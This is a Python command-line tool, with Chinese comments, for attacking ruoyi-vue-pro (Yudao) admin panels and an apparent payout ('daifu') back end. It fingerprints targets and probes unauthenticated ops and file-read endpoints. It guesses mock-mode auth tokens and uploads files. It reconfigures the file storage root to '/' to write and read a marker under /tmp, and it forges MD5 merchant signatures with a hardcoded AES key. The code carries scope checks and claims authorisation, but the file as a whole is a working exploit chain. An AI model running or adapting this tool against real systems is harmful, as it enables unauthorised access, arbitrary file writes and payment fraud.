#!/usr/bin/env python3
"""芋道 ruoyi-vue-pro / 代付管理端探针（授权范围内）。

对齐：传承/芋府·假面开天.md
  recon       指纹 + 未鉴权运维/文件下载
  mock        mock-enable 字典读 profile
  file        登录后 file-config / upload / PermitAll get（不改根路径）
  rce-marker  改 basePath=/ → 写读 /tmp marker → 恢复
  ops         未鉴权 /order/* 运维口
  sign        NewSignUtil MD5 大写试算

不默认：写 cron/SSH、changeMoney、真 daifu 下单。
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-yudao-daifu"
PREFIXES = ("/admin-api", "/api/admin-api")
PROFILE_PATHS = (
    "/system/user/profile/get",
    "/system/user/get-info",
    "/system/auth/get-permission-info",
)
MOCK_SECRETS = ("test", "mock", "admin", "yudao")
MOCK_UIDS = ("1", "2")
UNAUTH_OPS = (
    "/api/order/stopQueryOrderJob?start=true",
    "/api/order/autoNotifyDaifu",
    "/api/order/checkOrder",
    "/api/bot/message",
)
FILE_GET_HINTS = (
    "/infra/file/18/get/etc/hostname",
    "/infra/file/1/get/etc/hostname",
)
FAMILY_AES_KEYS = ("kdsfnkfdfsdfksdm",)
LOCAL_FILE_CLASS = (
    "cn.iocoder.yudao.framework.file.core.client.local.LocalFileClientConfig"
)


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def _sess(insecure: bool) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = UA
    s.verify = not insecure
    return s


def _req(
    sess: requests.Session,
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    **kw: Any,
) -> requests.Response | None:
    try:
        return sess.request(method, url, timeout=15, allow_redirects=True, headers=headers, **kw)
    except Exception:
        return None


def _snip(body: str, n: int = 240) -> str:
    t = (body or "").replace("\n", " ")
    return t[:n]


def _looks_yudao(body: str) -> bool:
    s = (body or "").lstrip()
    if not (s.startswith("{") or s.startswith("[")):
        return False
    return any(k in s for k in ('"code"', '"msg"', "账号未登录", "tenant"))


def _ok_biz(body: str) -> bool:
    try:
        obj = json.loads(body)
    except Exception:
        return False
    if not isinstance(obj, dict):
        return False
    return obj.get("code") in (0, "0")


def _mask(s: str, keep: int = 4) -> str:
    if not s or len(s) <= keep * 2:
        return "***"
    return s[:keep] + "…" + s[-keep:]


def new_sign(params: dict[str, str], secret: str) -> str:
    items = [f"{k}={params[k]}" for k in sorted(params) if k.lower() != "sign" and params[k] is not None]
    raw = "&".join(items) + "&key=" + secret
    return hashlib.md5(raw.encode("utf-8")).hexdigest().upper()


def detect_prefix(sess: requests.Session, base: str) -> str:
    for pref in PREFIXES:
        url = urljoin(base.rstrip("/") + "/", pref.lstrip("/") + "/")
        r = _req(sess, "GET", url)
        if r is None:
            continue
        if _looks_yudao(r.text) or r.status_code in (200, 401, 403):
            return pref
    return PREFIXES[0]


def auth_headers(token: str, tenant: str) -> dict[str, str]:
    return {
        "Authorization": f"Bearer {token}",
        "tenant-id": tenant,
        "Accept": "application/json",
    }


def try_profile(
    sess: requests.Session, base: str, prefix: str, token: str, tenant: str
) -> dict[str, Any]:
    out: dict[str, Any] = {"token": token, "hits": []}
    for path in PROFILE_PATHS:
        url = urljoin(base.rstrip("/") + "/", prefix.lstrip("/") + path)
        r = _req(sess, "GET", url, headers=auth_headers(token, tenant))
        if r is None:
            continue
        hit = {
            "url": url,
            "status": r.status_code,
            "ok": _ok_biz(r.text),
            "body": _snip(r.text),
        }
        if hit["ok"]:
            try:
                data = json.loads(r.text).get("data") or {}
                if isinstance(data, dict):
                    hit["username"] = data.get("username") or data.get("nickname")
                    hit["id"] = data.get("id")
                    hit["roles"] = data.get("roles") or data.get("role")
            except Exception:
                pass
        out["hits"].append(hit)
        if hit["ok"]:
            out["success"] = True
            return out
    out["success"] = False
    return out


def cmd_recon(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    sess = _sess(args.insecure)
    prefix = detect_prefix(sess, args.base)
    findings: list[dict[str, Any]] = []

    for path in (
        prefix + "/",
        "/doc.html",
        "/v3/api-docs",
        "/swagger-ui/index.html",
        prefix + "/system/user/profile/get",
    ):
        url = urljoin(args.base.rstrip("/") + "/", path.lstrip("/"))
        r = _req(sess, "GET", url)
        findings.append(
            {
                "kind": "finger",
                "url": url,
                "status": None if r is None else r.status_code,
                "yudao": False if r is None else _looks_yudao(r.text),
                "body": "" if r is None else _snip(r.text),
            }
        )

    for pref in PREFIXES:
        for hint in FILE_GET_HINTS:
            url = urljoin(args.base.rstrip("/") + "/", pref.lstrip("/") + hint)
            r = _req(sess, "GET", url)
            findings.append(
                {
                    "kind": "file-get-unauth",
                    "url": url,
                    "status": None if r is None else r.status_code,
                    "len": 0 if r is None else len(r.content or b""),
                    "body": "" if r is None else _snip(r.text, 120),
                }
            )

    for path in UNAUTH_OPS:
        url = urljoin(args.base.rstrip("/") + "/", path.lstrip("/"))
        r = _req(sess, "GET", url)
        findings.append(
            {
                "kind": "ops-unauth",
                "url": url,
                "status": None if r is None else r.status_code,
                "ok": False if r is None else (_ok_biz(r.text) or r.status_code == 200),
                "body": "" if r is None else _snip(r.text),
            }
        )

    payload = {
        "ts": _now(),
        "base": args.base,
        "prefix": prefix,
        "findings": findings,
    }
    out = write_probe_json(
        payload, case=args.case, case_subdir="yudao_daifu", filename="recon.json"
    )
    print(json.dumps({"out": str(out), "prefix": prefix, "n": len(findings)}, ensure_ascii=False))


def cmd_mock(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    sess = _sess(args.insecure)
    prefix = args.prefix or detect_prefix(sess, args.base)
    tokens = [args.token] if args.token else [s + u for s in MOCK_SECRETS for u in MOCK_UIDS]
    results = [try_profile(sess, args.base, prefix, t, args.tenant) for t in tokens]
    wins = [r for r in results if r.get("success")]
    payload = {
        "ts": _now(),
        "base": args.base,
        "prefix": prefix,
        "wins": wins,
        "tried": tokens,
        "results": results,
    }
    out = write_probe_json(
        payload, case=args.case, case_subdir="yudao_daifu", filename="mock.json"
    )
    print(
        json.dumps(
            {
                "out": str(out),
                "success": bool(wins),
                "tokens": [w["token"] for w in wins],
                "users": [h.get("username") for w in wins for h in w["hits"] if h.get("ok")],
            },
            ensure_ascii=False,
        )
    )


def _file_page(
    sess: requests.Session, base: str, prefix: str, token: str, tenant: str
) -> list[dict[str, Any]]:
    rows: list[dict[str, Any]] = []
    for path in ("/infra/file-config/page", "/infra/file-config/simple-list"):
        url = urljoin(base.rstrip("/") + "/", prefix.lstrip("/") + path)
        r = _req(
            sess,
            "GET",
            url,
            headers=auth_headers(token, tenant),
            params={"pageNo": 1, "pageSize": 20},
        )
        if r is None or not _ok_biz(r.text):
            continue
        try:
            data = json.loads(r.text).get("data")
            lst = data.get("list") if isinstance(data, dict) else data
            if isinstance(lst, list):
                for item in lst:
                    if isinstance(item, dict):
                        rows.append(item)
        except Exception:
            continue
    return rows


def cmd_file(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    if not args.token:
        raise SystemExit("[file] 需要 --token（先跑 mock）")
    sess = _sess(args.insecure)
    prefix = args.prefix or detect_prefix(sess, args.base)
    configs = _file_page(sess, args.base, prefix, args.token, args.tenant)
    upload_url = urljoin(args.base.rstrip("/") + "/", prefix.lstrip("/") + "/infra/file/upload")
    files = {"file": ("se_probe.txt", b"daaixianzun-yudao-file-l2\n", "text/plain")}
    r = _req(
        sess,
        "POST",
        upload_url,
        headers=auth_headers(args.token, args.tenant),
        files=files,
        data={"path": "se_probe.txt"},
    )
    upload = {
        "url": upload_url,
        "status": None if r is None else r.status_code,
        "ok": False if r is None else _ok_biz(r.text),
        "body": "" if r is None else _snip(r.text),
    }
    gets = []
    for c in configs[:6]:
        cid = c.get("id")
        if cid is None:
            continue
        gurl = urljoin(
            args.base.rstrip("/") + "/",
            prefix.lstrip("/") + f"/infra/file/{cid}/get/se_probe.txt",
        )
        gr = _req(sess, "GET", gurl)
        gets.append(
            {
                "url": gurl,
                "status": None if gr is None else gr.status_code,
                "len": 0 if gr is None else len(gr.content or b""),
                "body": "" if gr is None else _snip(gr.text, 80),
            }
        )
    payload = {
        "ts": _now(),
        "base": args.base,
        "prefix": prefix,
        "configs": [
            {
                "id": c.get("id"),
                "name": c.get("name"),
                "storage": c.get("storage"),
                "basePath": ((c.get("config") or {}) if isinstance(c.get("config"), dict) else {}).get(
                    "basePath"
                ),
            }
            for c in configs
        ],
        "upload": upload,
        "gets": gets,
    }
    out = write_probe_json(
        payload, case=args.case, case_subdir="yudao_daifu", filename="file.json"
    )
    print(json.dumps({"out": str(out), "configs": len(configs), "upload_ok": upload["ok"]}, ensure_ascii=False))


def _pick_local(configs: list[dict[str, Any]]) -> dict[str, Any] | None:
    for c in configs:
        cfg = c.get("config") if isinstance(c.get("config"), dict) else {}
        storage = c.get("storage")
        if storage in (10, "10") or (isinstance(cfg, dict) and "basePath" in cfg):
            return c
    return configs[0] if configs else None


def cmd_rce_marker(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    if not args.token:
        raise SystemExit("[rce-marker] 需要 --token")
    sess = _sess(args.insecure)
    prefix = args.prefix or detect_prefix(sess, args.base)
    configs = _file_page(sess, args.base, prefix, args.token, args.tenant)
    target = _pick_local(configs)
    if not target:
        raise SystemExit("[rce-marker] 无 file-config，先跑 file")
    cfg = dict(target.get("config") or {})
    old_base = cfg.get("basePath") or "/www/data/upload"
    domain = cfg.get("domain") or ""
    update_url = urljoin(args.base.rstrip("/") + "/", prefix.lstrip("/") + "/infra/file-config/update")

    def _update(base_path: str) -> requests.Response | None:
        body = {
            "id": target.get("id"),
            "name": target.get("name") or "file",
            "storage": target.get("storage") if target.get("storage") is not None else 10,
            "remark": target.get("remark") or "",
            "config": {
                "@class": cfg.get("@class") or LOCAL_FILE_CLASS,
                "basePath": base_path,
                "domain": domain,
            },
        }
        return _req(
            sess,
            "PUT",
            update_url,
            headers={**auth_headers(args.token, args.tenant), "Content-Type": "application/json"},
            json=body,
        )

    marker_name = "tmp/se_yudao_marker.txt"
    marker_body = f"daaixianzun-marker {_now()}\n"
    steps: dict[str, Any] = {"id": target.get("id"), "old_base": old_base}

    r1 = _update("/")
    steps["set_root"] = {
        "status": None if r1 is None else r1.status_code,
        "ok": False if r1 is None else _ok_biz(r1.text),
        "body": "" if r1 is None else _snip(r1.text),
    }

    up_url = urljoin(args.base.rstrip("/") + "/", prefix.lstrip("/") + "/infra/file/upload")
    r2 = _req(
        sess,
        "POST",
        up_url,
        headers=auth_headers(args.token, args.tenant),
        files={"file": ("se_yudao_marker.txt", marker_body.encode(), "text/plain")},
        data={"path": marker_name},
    )
    steps["upload"] = {
        "status": None if r2 is None else r2.status_code,
        "ok": False if r2 is None else _ok_biz(r2.text),
        "body": "" if r2 is None else _snip(r2.text),
    }

    get_url = urljoin(
        args.base.rstrip("/") + "/",
        prefix.lstrip("/") + f"/infra/file/{target.get('id')}/get/{marker_name}",
    )
    r3 = _req(sess, "GET", get_url)
    got = (r3.text if r3 is not None else "") or ""
    steps["read"] = {
        "url": get_url,
        "status": None if r3 is None else r3.status_code,
        "ok": "daaixianzun-marker" in got,
        "body": _snip(got, 80),
    }

    r4 = _update(old_base)
    steps["restore"] = {
        "status": None if r4 is None else r4.status_code,
        "ok": False if r4 is None else _ok_biz(r4.text),
        "body": "" if r4 is None else _snip(r4.text),
    }

    payload = {"ts": _now(), "base": args.base, "prefix": prefix, "steps": steps}
    out = write_probe_json(
        payload, case=args.case, case_subdir="yudao_daifu", filename="rce_marker.json"
    )
    print(
        json.dumps(
            {
                "out": str(out),
                "l3": bool(steps["read"]["ok"]),
                "restored": bool(steps["restore"]["ok"]),
            },
            ensure_ascii=False,
        )
    )


def cmd_ops(args: argparse.Namespace) -> None:
    ensure_scope(args.base)
    sess = _sess(args.insecure)
    rows = []
    for path in UNAUTH_OPS:
        url = urljoin(args.base.rstrip("/") + "/", path.lstrip("/"))
        r = _req(sess, "GET", url)
        rows.append(
            {
                "url": url,
                "status": None if r is None else r.status_code,
                "ok": False if r is None else (_ok_biz(r.text) or (r.status_code == 200 and len(r.text) < 400)),
                "body": "" if r is None else _snip(r.text),
            }
        )
    payload = {"ts": _now(), "base": args.base, "ops": rows, "aes_family_keys": FAMILY_AES_KEYS}
    out = write_probe_json(
        payload, case=args.case, case_subdir="yudao_daifu", filename="ops.json"
    )
    print(json.dumps({"out": str(out), "hits": [x for x in rows if x["ok"]]}, ensure_ascii=False))


def cmd_sign(args: argparse.Namespace) -> None:
    if not args.secret:
        raise SystemExit("[sign] 需要 --secret")
    try:
        params = json.loads(args.params)
    except Exception as e:
        raise SystemExit(f"[sign] --params 必须是 JSON: {e}") from e
    if not isinstance(params, dict):
        raise SystemExit("[sign] --params 必须是对象")
    flat = {str(k): "" if v is None else str(v) for k, v in params.items()}
    sig = new_sign(flat, args.secret)
    print(json.dumps({"sign": sig, "memberid_hint": "1000+df_user.id"}, ensure_ascii=False))


def main() -> None:
    p = argparse.ArgumentParser(description="芋道代付 / mock-token / 本地文件链探针")
    p.add_argument("cmd", choices=("recon", "mock", "file", "rce-marker", "ops", "sign"))
    p.add_argument("--base", default="", help="https://授权站")
    p.add_argument("--case", default="", help="案卷名")
    p.add_argument("--token", default="", help="Mock 或会话 token（不要带 Bearer）")
    p.add_argument("--tenant", default="1")
    p.add_argument("--prefix", default="", help="强制 /admin-api 或 /api/admin-api")
    p.add_argument("--params", default="{}", help="sign 用 JSON 参数")
    p.add_argument("--secret", default="", help="商户 appSecret（打码，仅本地试算）")
    p.add_argument("--insecure", action="store_true")
    args = p.parse_args()
    if args.cmd != "sign" and not args.base:
        raise SystemExit("需要 --base")
    if args.cmd == "recon":
        cmd_recon(args)
    elif args.cmd == "mock":
        cmd_mock(args)
    elif args.cmd == "file":
        cmd_file(args)
    elif args.cmd == "rce-marker":
        cmd_rce_marker(args)
    elif args.cmd == "ops":
        cmd_ops(args)
    else:
        cmd_sign(args)


if __name__ == "__main__":
    main()
